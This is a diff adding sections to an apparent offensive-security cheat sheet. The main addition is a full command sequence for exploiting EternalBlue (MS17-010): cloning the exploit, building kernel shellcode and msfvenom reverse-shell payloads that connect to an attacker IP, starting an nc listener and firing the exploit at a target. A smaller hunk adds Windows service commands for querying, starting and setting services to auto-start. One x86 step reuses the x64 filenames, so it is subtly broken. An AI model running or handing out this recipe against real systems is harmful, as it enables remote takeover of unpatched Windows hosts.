@@ -1210,6 +1210,49 @@ echo $VARIABLE_HERE
 
 
 
+## ETERNALBLUE
+```bash
+# setup virtualenv for PY2
+virtualenv --python=python2 venv
+source venv/bin/activate
+
+# install impacket
+pip2.7 install impacket
+
+# get exploit
+git clone https://github.com/worawit/MS17-010.git
+
+#check whether target is vulnerable
+python checker.py IP_here
+
+# generate shellcode
+ls -l MS17-010/shellcode/
+## x64
+### assemble kernel shellcode
+nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
+### generate payload
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here --platform windows -a x64 --format raw -o sc_x64_payload.bin
+### merge shellcode + payload
+cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
+## x86
+### assemble kernel shellcode
+nasm -f bin MS17-010/shellcode/eternalblue_kshellcode_x86.asm -o ./sc_x86_kernel.bin
+### generate payload
+msfvenom -p windows/shell_reverse_tcp LHOST=attacker_IP_here LPORT=port_here --platform windows -a x86 --format raw -o sc_x86_payload.bin
+### merge shellcode + payload
+cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
+## merge binaries (optional)
+python MS17-010/shellcode/eternalblue_sc_merge.py sc_x86.bin sc_x64.bin sc_all.bin
+
+# setup listener
+rlwrap nc -lnvp port_here
+
+# run exploit
+python MS17-010/eternalblue_exploitversion_here.py target_IP_here /path/to/sc_all.bin
+```
+
+
+
 ## EVIL-WINRM
 ```bash
 # get shell on IP_here as user
@@ -3188,11 +3231,18 @@ samdump2 /path/to/copy/of/system /path/to/copy/of/sam
 # show service config
 sc.exe qc service_name_here
 
+# get service state
+sc.exe query service_name_here
+
 # start service
 sc.exe start service_name_here
+net start service_name_here
 
 # stop service
 sc.exe stop service_name_here
+
+# change service config : change START_TYPE to AUTOMATIC / AUTO_START
+sc.exe config service_name_here start= auto
 ```
 
 
